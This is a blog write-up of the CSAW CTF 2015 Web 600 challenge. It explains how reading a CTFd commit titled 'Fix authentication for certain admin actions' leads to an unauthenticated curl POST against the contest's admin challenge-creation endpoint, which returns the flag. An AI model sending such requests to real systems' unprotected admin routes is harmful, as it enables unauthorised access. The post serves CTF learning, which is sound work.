---
layout: post
title: "CSAW CTF 2015 - Web 600 Writeup"
date: 2015-09-21 18:00
comments: true
categories: 
- csaw2015
- writeup
- ctf
---
<img src="{{root_url}}/images/headers/csaw_600.png"/>

This one was surprisingly easy if you knew where to look.

For this challenge, we were presented with a hint that indicated there was a vulnerability in the code used to run the CSAW CTF. I remember seeing a while back that the platform was [open-sourced](https://github.com/isislab/CTFd).

When looking for bugs in open-source projects, both Issues and Commits are good places to start out. In this case, we see [a commit](https://github.com/isislab/CTFd/commit/9578355143d7af675fc4776b0f2de802be91e261) recently made with the message "Fix authentication for certain admin actions"

The ```/admin/chal/new``` function would be pretty dangerous since it might allow us to upload a file. Let's see what happens if we make a POST to that endpoint:

```
jordan@temp:~$ curl https://ctf.isis.poly.edu/admin/chal/new -XPOST
flag{at_least_it_isnt_php}
```

Easy enough.

Jordan ([@jw_sec](https://twitter.com/jw_sec))
